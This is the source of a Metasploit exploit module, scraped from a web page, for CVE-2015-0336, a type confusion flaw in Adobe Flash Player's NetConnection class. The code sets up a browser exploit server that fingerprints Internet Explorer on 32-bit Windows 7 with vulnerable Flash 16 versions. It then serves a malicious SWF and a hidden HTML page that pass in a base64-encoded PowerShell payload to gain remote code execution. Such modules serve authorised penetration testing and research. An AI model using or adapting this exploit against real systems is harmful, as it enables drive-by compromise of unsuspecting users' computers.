# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Adobe Flash Player NetConnection Type Confusion&#039;,
      &#039;Description&#039;         => %q{
        This module exploits a type confusion vulnerability in the NetConnection class on
        Adobe Flash Player. When using a correct memory layout this vulnerability allows
        to corrupt arbitrary memory. It can be used to overwrite dangerous objects, like
        vectors, and finally accomplish remote code execution. This module has been tested
        successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with Flash 16.0.0.305.
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              =>
        [
          &#039;Natalie Silvanovich&#039;, # Vulnerability discovery and Google Project Zero Exploit
          &#039;Unknown&#039;, # Exploit in the wild
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;References&#039;          =>
        [
          [&#039;CVE&#039;, &#039;2015-0336&#039;],
          [&#039;URL&#039;, &#039;https://helpx.adobe.com/security/products/flash-player/apsb15-05.html&#039;],
          [&#039;URL&#039;, &#039;http://googleprojectzero.blogspot.com/2015/04/a-tale-of-two-exploits.html&#039;],
          [&#039;URL&#039;, &#039;http://malware.dontneedcoffee.com/2015/03/cve-2015-0336-flash-up-to-1600305-and.html&#039;],
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2015/03/cve-2015-0336_nuclea.html&#039;],
          [&#039;URL&#039;, &#039;https://blog.malwarebytes.org/exploits-2/2015/03/nuclear-ek-leverages-recently-patched-flash-vulnerability/&#039;]
        ],
      &#039;Payload&#039;             =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;            => &#039;win&#039;,
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :os_name => OperatingSystems::Match::WINDOWS_7,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^16\./ && Gem::Version.new(ver) <= Gem::Version.new(&#039;16.0.0.305&#039;) },
          :arch    => ARCH_X86
        },
      &#039;Targets&#039;             =>
        [
          [ &#039;Automatic&#039;, {} ]
        ],
      &#039;Privileged&#039;          => false,
      &#039;DisclosureDate&#039;      => &#039;Mar 12 2015&#039;,
      &#039;DefaultTarget&#039;       => 0))
  end
 
  def exploit
    @swf = create_swf
    @trigger = create_trigger
    super
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")
 
    if request.uri =~ /\.swf$/
      print_status(&#039;Sending SWF...&#039;)
      send_response(cli, @swf, {&#039;Content-Type&#039;=>&#039;application/x-shockwave-flash&#039;, &#039;Cache-Control&#039; => &#039;no-cache, no-store&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end
 
    print_status(&#039;Sending HTML...&#039;)
    send_exploit_html(cli, exploit_template(cli, target_info), {&#039;Pragma&#039; => &#039;no-cache&#039;})
  end
 
  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    psh_payload = cmd_psh_payload(target_payload, &#039;x86&#039;, {remove_comspec: true})
    b64_payload = Rex::Text.encode_base64(psh_payload)
 
    trigger_hex_stream = @trigger.unpack(&#039;H*&#039;)[0]
 
    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&tr=<%=trigger_hex_stream%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&tr=<%=trigger_hex_stream%>" Play="true"/>
    </object>
    </body>
    </html>
    |
 
    return html_template, binding()
  end
 
  def create_swf
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-0336&#039;, &#039;msf.swf&#039;)
    swf =  ::File.open(path, &#039;rb&#039;) { |f| swf = f.read }
 
    swf
  end
 
  def create_trigger
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-0336&#039;, &#039;trigger.swf&#039;)
    swf =  ::File.open(path, &#039;rb&#039;) { |f| swf = f.read }
 
    swf
  end
end

